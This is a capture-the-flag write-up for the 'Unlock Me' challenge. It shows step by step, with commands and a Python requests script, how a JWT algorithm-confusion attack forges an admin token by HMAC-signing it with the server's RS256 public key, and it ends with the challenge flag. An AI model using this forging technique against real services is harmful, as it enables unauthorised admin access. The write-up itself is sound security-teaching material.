# Unlock Me

> Our agents discovered COViD's admin panel! They also stole the credentials minion:banana, but it seems that the user isn't allowed in. Can you find another way?

## Reconnaissance

Looking at the admin panel all we had was a simple login, with a username input and a password input.  
Inputting minion as the username and banana as the password as given will give us a message :

> Only admins are allowed into HQ!

Ok, since they gave us some initial credentials it doesn't seem to be a SQL injection type of challenge, instead it seems to be a JWT Token (JSON Web Token) vulnerability question.  
Inspecting the admin panel did indeed give us a header containing a JWT Token : 

> eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NTIwMTczfQ.vimuOyxfZCp-bPpAuFcWvbF1SCOwfWj09nG4wVeYduDcpF36anryPCMr1LVARQO2GrdlEvNbdSoVh6MSyH3LwCjPSS-Pcn1WOfcSEoH0Gl6Yf8NlD5gAT9bHCrTtCX3dVq7Z7lsgPLTJW1xS6FRq8julkQirDDEge72UNxyOmky1kvXJBTkXorCVRVJ4kT3oas0yTWV7NtkzDWUwtVCld7lOc7B3pp6YwreMcPdCIQclTXh9M4gBEZusLp-XI8wmtQtZZpTk2bbZQkBbr3ByQQgc7PxvKguv0xA_tO5oTXA2SjnCm7wkrTi4QDw7thAcG5duY_NbNzuzoJxFnzbw-GbJQQ5gHLAdM1l8zbFeueBD9NiitcO_9eeooibJw4dUaRoR3yiltYVW3WZoxevvm9MBwI8Nl7-TIzcedY9JTY5UzfxoFUFuxYRkaZysdfl4TTun_Ri27QbWGwdfKuVIsZiWdpLlzxfnSfMfzLKJmMKwciTbOS1ikn550qlf7jPTDtcXaeyucqPv_-GpFi6EN8MvaeRXkzxkj_oMnZt3KUdL7cuYkw4AK7Pb1jV4baxyFASFuhnWYmjfGbgjgunHZxupZ7h2hoOMgwF-1B6DbLq-Tg_kMgCq8AqluWlj1c82Opvb2USUEo9bRKtgbxCdOGMtRRbSxhgLgHp9dggVDGA

Putting this through [jwt.io](https://jwt.io/) will give us :

```
{
  "alg": "RS256",
  "typ": "JWT"
}
```

and 

```
{
  "username": "minion",
  "role": "user",
  "iat": 1607520173
}
```

Finally, looking through the source code of the website will allow us to see a comment : 

> // TODO: Add client-side verification using public.pem</script></body></html><script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>

## Breaking down the challenge

So we were given a JTW Token, and a public key.  
All these point towards changing the algorithm from RS256 to HS256 and using the public key to forge a signature to get into the admin panel as an admin user.

## Getting the new JTW Token

Before doing all that however, I wanted to see if doing something simpler would be enough to get me into the admin panel, such as changing the algorithm used in the token to "None".  
Using [jwt_tool](https://github.com/ticarpi/jwt_tool) to tweak the token I was able to change the algorithm, then sent the token to the panel.  
Unfortunately it didn't work. Oh well, never hurts to try. 
  
Now changing the algorithm to HS256 will give me the token : 

> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzA5MjE1OX0

Now all I need to do is to get the signature.  
Lets turn the public key from public.pem into ASCII hex : 
> cat key.pem | xxd -p | tr -d "\\n"

> 2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494943496a414e42676b71686b6947397730424151454641414f43416738414d49494343674b434167454134436f74316d4d30654635635a556e69664b78300a384d4a5135397569392f38444c7a57705757746c504773423454395573614173706e645a4a61666247467130762b76477a472b546c744a6a6231762b74546a380a737146616e632f4b5764515a723357776d7568553935454a3752526874454978544e38526e314b4f4b55715a2f506c6d66344c724d724d5a6d363644716154570a48326d7935495253684b30693059707a6954394a4565564a74532f7a432b55556462496d724f61766a443450445a763134464c457565504d4e306d434e6351350a7a3569535176356a386e706274764d426265414b4d76597943654963686a57323244702f744e69347866493743615479507030704f332b4d5a39764a384f30320a594f43372f2b745158324e64766556754b594567345854512f6e6d6959534b39446558794f2f45476b517a785a6a704c76355a4d4e30374e6175327870516f470a314970345966444135592f4d6a41387144674e4e306e2f706d42615042484e76464b366d574a6c6c6e754f6e4c70514843785a4e7842756478544c536f586b710a585150524b63645a706276306b6a742f5a70776b6f584866514c546f4a795a51675158744548615733364b6f39586a71336344577a6b536a41444d7861712f350a38535a7650556b6e6d334d76394b4e387a596965505947556c32614c794b756d4b462b2b726c68376136784a676342637331306266307979655255334e5757620a30707a3464676472676832735872672f5535315668656a6e4e66766652662b34437931514d345157624b585a6b39734c744c706b66696f752f72693359556e330a7478496766594b61376135744f744257535248486c484f6d53353841623531706d5347646a496543612b574d6965306935726575526236574a32376a6e764a460a4730687974414242624367654c3030796d4a4b31367455434177454141513d3d0a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a

Ok, now lets sign the JWT.

> echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzA5MjE1OX0"  |  openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494943496a414e42676b71686b6947397730424151454641414f43416738414d49494343674b434167454134436f74316d4d30654635635a556e69664b78300a384d4a5135397569392f38444c7a57705757746c504773423454395573614173706e645a4a61666247467130762b76477a472b546c744a6a6231762b74546a380a737146616e632f4b5764515a723357776d7568553935454a3752526874454978544e38526e314b4f4b55715a2f506c6d66344c724d724d5a6d363644716154570a48326d7935495253684b30693059707a6954394a4565564a74532f7a432b55556462496d724f61766a443450445a763134464c457565504d4e306d434e6351350a7a3569535176356a386e706274764d426265414b4d76597943654963686a57323244702f744e69347866493743615479507030704f332b4d5a39764a384f30320a594f43372f2b745158324e64766556754b594567345854512f6e6d6959534b39446558794f2f45476b517a785a6a704c76355a4d4e30374e6175327870516f470a314970345966444135592f4d6a41387144674e4e306e2f706d42615042484e76464b366d574a6c6c6e754f6e4c70514843785a4e7842756478544c536f586b710a585150524b63645a706276306b6a742f5a70776b6f584866514c546f4a795a51675158744548615733364b6f39586a71336344577a6b536a41444d7861712f350a38535a7650556b6e6d334d76394b4e387a596965505947556c32614c794b756d4b462b2b726c68376136784a676342637331306266307979655255334e5757620a30707a3464676472676832735872672f5535315668656a6e4e66766652662b34437931514d345157624b585a6b39734c744c706b66696f752f72693359556e330a7478496766594b61376135744f744257535248486c484f6d53353841623531706d5347646a496543612b574d6965306935726575526236574a32376a6e764a460a4730687974414242624367654c3030796d4a4b31367455434177454141513d3d0a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a

The output from that, which is the HMAC signature is : 
> 0311ae0fd789019d69183a805f7223ceeed22dde4be584cd737c42857dd99b44

Finally, lets this ASCII hex signature back into what our JWT token can use : 

> python -c "exec("import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('0311ae0fd789019d69183a805f7223ceeed22dde4be584cd737c42857dd99b44')).replace('=','')")"

Which will yield our final signature : 
> AxGuD9eJAZ1pGDqAX3Ijzu7SLd5L5YTNc3xChX3Zm0Q

We can now send our finished JWT token to the admin panel. 
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzA5MjE1OX0.AxGuD9eJAZ1pGDqAX3Ijzu7SLd5L5YTNc3xChX3Zm0Q

## Sending the new JWT token

```
import requests

cookies = {
    '__cfduid': 'd12cf865aba76909cfdd8faf4e84d6f2d1607044540',
}

Alg = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzA5MjE1OX0.AxGuD9eJAZ1pGDqAX3Ijzu7SLd5L5YTNc3xChX3Zm0Q'

headers = {
    'Connection': 'keep-alive',
    'Authorization': 'Bearer ' + Alg,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Accept': '*/*',
    'Referer': 'http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/',
    'Accept-Language': 'en-US,en;q=0.9',
    'If-None-Match': 'W/"2c-HIo8OazkINs/Y63UTfaXAuuMrWk"',
}

response = requests.get('http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock', headers=headers, cookies=cookies, verify=False)

print(response.content)
```

> {"flag":"govtech-csg{5!gN_0F_+h3_T!m3S}"}